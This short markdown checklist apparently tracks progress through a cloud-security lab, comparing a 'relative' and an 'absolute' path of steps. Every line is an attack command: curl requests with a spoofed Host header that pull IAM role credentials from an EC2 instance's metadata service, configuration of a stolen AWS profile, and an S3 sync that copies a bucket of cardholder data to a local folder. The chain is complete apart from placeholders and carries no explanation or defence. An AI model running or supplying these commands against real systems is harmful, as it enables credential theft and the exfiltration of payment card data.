# Relative path

- [x] curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
- [x] aws configure --profile erratic
- [x] aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic

Steps: 3
Completed: 3

# Absolute path

- [ ] curl -s http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/ -H 'Host:169.254.169.254'
- [x] curl http://<ec2-ip-address>/latest/meta-data/iam/security-credentials/<ec2-role-name> -H 'Host:169.254.169.254' // Exploit step
- [x] aws configure --profile erratic
- [ ] aws_session_token = \<session-token\>
- [ ] aws s3 ls --profile erratic
- [x] aws s3 sync s3://<bucket-name> ./cardholder-data --profile erratic

Steps: 6
Completed: 3
